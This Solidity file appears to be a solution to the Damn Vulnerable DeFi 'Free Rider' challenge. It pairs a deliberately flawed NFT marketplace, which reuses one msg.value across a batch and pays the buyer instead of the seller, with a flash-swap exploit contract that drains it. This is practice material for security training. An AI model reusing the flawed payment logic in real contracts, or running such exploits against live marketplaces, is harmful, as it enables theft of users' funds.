// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderRecovery.sol";
// import console
import "hardhat/console.sol";

// import WETH9
import "solmate/src/tokens/WETH.sol";
/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public offersCount;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    error InvalidPricesAmount();
    error InvalidTokensAmount();
    error InvalidPrice();
    error CallerNotOwner(uint256 tokenId);
    error InvalidApproval();
    error TokenNotOffered(uint256 tokenId);
    error InsufficientPayment();

    constructor(uint256 amount) payable {
        DamnValuableNFT _token = new DamnValuableNFT();
        _token.renounceOwnership();
        for (uint256 i = 0; i < amount; ) {
            _token.safeMint(msg.sender);
            unchecked {
                ++i;
            }
        }
        token = _token;
    }

    function offerMany(
        uint256[] calldata tokenIds,
        uint256[] calldata prices
    ) external nonReentrant {
        uint256 amount = tokenIds.length;
        if (amount == 0) revert InvalidTokensAmount();

        if (amount != prices.length) revert InvalidPricesAmount();

        for (uint256 i = 0; i < amount; ) {
            unchecked {
                _offerOne(tokenIds[i], prices[i]);
                ++i;
            }
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        DamnValuableNFT _token = token; // gas savings

        if (price == 0) revert InvalidPrice();

        if (msg.sender != _token.ownerOf(tokenId))
            revert CallerNotOwner(tokenId);

        if (
            _token.getApproved(tokenId) != address(this) &&
            !_token.isApprovedForAll(msg.sender, address(this))
        ) revert InvalidApproval();

        offers[tokenId] = price;

        assembly {
            // gas savings
            sstore(0x02, add(sload(0x02), 0x01))
        }

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(
        uint256[] calldata tokenIds
    ) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; ) {
            unchecked {
                _buyOne(tokenIds[i]);
                ++i;
            }
        }
    }

    function _buyOne(uint256 tokenId) private {
        console.log("msg.value: %s", msg.value);
        uint256 priceToPay = offers[tokenId];
        console.log("priceToPay: %s", priceToPay);
        if (priceToPay == 0) revert TokenNotOffered(tokenId);

        if (msg.value < priceToPay) revert InsufficientPayment();

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
        console.log("msg.sender: %s", msg.sender);
        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}

contract FreeRiderExploit is IERC721Receiver {
    FreeRiderNFTMarketplace public marketplace;
    address public immutable pair;
    FreeRiderRecovery public recovery;
     address payable owner;

    constructor(
        address payable _marketplace,
        address _pair,
        address _recovery
    ) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        pair = _pair;
        recovery = FreeRiderRecovery(_recovery);
        owner = payable(msg.sender);
    }

    function exploit() external payable {
        // flash swap
        uint256 amount = 15 ether;
        bytes memory data = abi.encodeWithSignature(
            "swap(uint256,uint256,address,bytes)",
            amount,
            0,
            address(this),
            "1"
        );
        (bool success, ) = pair.call(data);
        require(success, "Flash swap failed");
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        // unwrap WETH
        (, bytes memory res) = pair.call(abi.encodeWithSignature("token0()"));
        WETH weth = WETH(abi.decode(res, (address)));
        console.log("amount0: %s", amount0);
        weth.withdraw(weth.balanceOf(address(this)));
       
        // buy all 6 NFTs
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: 15 ether}(tokenIds);
        console.log("this balance: %s", address(this).balance);
        // transfer all NFTs to recovery contract
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(marketplace.token()).approve(address(recovery), i);
            DamnValuableNFT(marketplace.token()).transferFrom(
                address(this),
                address(recovery),
                i
            );
        }
        console.log("recovery address: %s", address(recovery));
        // close flash swap
         uint256 fee = ((amount0 * 3) / 997) + 1;
        uint256 amountToRepay = amount0 + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);
        selfdestruct(owner);
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {
        console.log("onERC721Received");
        return this.onERC721Received.selector;
    }
}
